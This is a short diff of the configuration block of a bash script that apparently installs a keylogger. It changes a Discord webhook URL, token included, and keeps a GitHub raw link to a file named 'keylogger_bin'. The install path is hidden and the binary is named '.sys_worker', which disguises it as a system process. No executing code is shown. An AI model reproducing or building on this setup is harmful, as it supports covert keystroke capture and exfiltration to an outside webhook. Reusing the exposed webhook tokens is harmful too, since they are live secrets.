@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ─── Configuration ───────────────────────────────────────
-WEBHOOK_URL="https://discord.com/api/webhooks/1364683763170283672/iLME1HvQUf85TgjkucHa_U5HqYX7K43aNvPTO1A7NcVRyXvFwIP4urmjnYv9C1yezCmZ"
+WEBHOOK_URL="https://discord.com/api/webhooks/1488635228603023371/V5RAgOeKALap4uu2J3QeOBpGHyXXlr9X7OKGAWB1h5wYpRU5LtSQOPdqimbtkdRIizn_"
 GITHUB_BIN_URL="https://raw.githubusercontent.com/Tomatorgb/KlinuxconfigL/main/keylogger_bin"
 INSTALL_DIR="/usr/local/src/.bin"
 BINARY_NAME=".sys_worker"
